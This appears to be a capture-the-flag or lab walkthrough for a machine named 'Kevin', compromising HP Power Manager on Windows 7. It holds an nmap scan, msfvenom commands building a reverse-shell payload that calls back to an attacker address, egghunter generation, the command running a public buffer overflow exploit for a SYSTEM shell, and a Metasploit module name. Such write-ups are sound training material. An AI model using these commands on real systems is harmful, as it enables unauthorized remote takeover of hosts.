---
description: Use public Buffer Overflow exploit to gain elevated privilege
---

# Kevin

## Summary

* HP Power Manager runs on port 80, allowing admins to log in using the default password.&#x20;
* A vulnerable version of HP Power Manager was discovered upon logging in, which can be exploited using a publicly available exploit.
* On executing the exploit, we will get the `NT SYSTEM` shell.

## Let's unpack

### Enumeration

```bash
# NMAP
sudo nmap -sC -sN -A -oN nmapFull -p- -A 192.168.166.45

Nmap scan report for 192.168.166.45
Host is up (0.086s latency).

PORT     STATE SERVICE            VERSION
80/tcp   open  http               GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.166.45/index.asp
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2024-06-25T15:53:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2024-03-22T01:47:18
|_Not valid after:  2024-09-21T01:47:18
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2024-06-25T15:53:10+00:00
3573/tcp open  tag-ups-1?

```

### Initial Foothold

Getting Shell without using Metasploit

Exploit used: [https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/README.md](https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/README.md).

```bash
# Creating payload and replacing it at line 34
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.225 LPORT=4411  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
> # Replace the payload as mentioned in the exploit

# using msf-egghunter to create egghunter 
 msf-egghunter -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'
> # Replace the egghunter as mentioned in the exploit


# that's it; execute the exploit and get back to the admin shell
python3 hp_pm_exploit_p3.py 192.168.166.45 80 4411

```

You can use the following exploit to get a shell using Metasploit

<pre class="language-bash"><code class="lang-bash"># exploit used
<strong>use exploit/windows/http/hp_power_manager_filename
</strong>
</code></pre>



